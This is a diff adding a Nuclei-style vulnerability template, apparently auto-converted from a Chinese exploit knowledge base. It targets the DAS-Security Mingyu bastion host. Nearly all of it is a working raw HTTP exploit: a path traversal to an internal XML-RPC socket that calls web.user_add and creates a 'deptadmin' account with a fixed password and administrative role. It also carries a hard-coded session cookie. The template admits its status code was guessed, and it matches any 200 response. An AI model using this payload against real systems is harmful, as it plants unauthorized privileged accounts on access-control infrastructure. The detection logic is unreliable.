@@ -1,0 +1,299 @@
+id: poc-uzhufntzspg9sm1l
+info:
+  name: 安恒明御运维审计与风险控制系统堡垒机任意用户注册
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uzhufntzspg9sm1l
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uzhufntzspg9sm1l
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
+
+
+    Cache-Control: max-age=0
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Cookie: LANG=zh; USM=0a0e1f29d69f4b9185430328b44ad990832935dbf1b90b8769d297dd9f0eb848
+
+
+
+
+    <?xml version="1.0"?>
+
+
+    <methodCall>
+
+
+    <methodName>web.user_add</methodName>
+
+
+    <params>
+
+
+    <param>
+
+
+    <value>
+
+
+    <array>
+
+
+    <data>
+
+
+    <value>
+
+
+    <string>admin</string>
+
+
+    </value>
+
+
+    <value>
+
+
+    <string>5</string>
+
+
+    </value>
+
+
+    <value>
+
+
+    <string>XX.XX.XX.XX</string>
+
+
+    </value>
+
+
+    </data>
+
+
+    </array>
+
+
+    </value>
+
+
+    </param>
+
+
+    <param>
+
+
+    <value>
+
+
+    <struct>
+
+
+    <member>
+
+
+    <name>uname</name>
+
+
+    <value>
+
+
+    <string>deptadmin</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>name</name>
+
+
+    <value>
+
+
+    <string>deptadmin</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>pwd</name>
+
+
+    <value>
+
+
+    <string>Deptadmin@123</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>authmode</name>
+
+
+    <value>
+
+
+    <string>1</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>deptid</name>
+
+
+    <value>
+
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>email</name>
+
+
+    <value>
+
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>mobile</name>
+
+
+    <value>
+
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>comment</name>
+
+
+    <value>
+
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+
+    <name>roleid</name>
+
+
+    <value>
+
+
+    <string>101</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    </struct></value>
+
+
+    </param>
+
+
+    </params>
+
+
+    </methodCall>
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
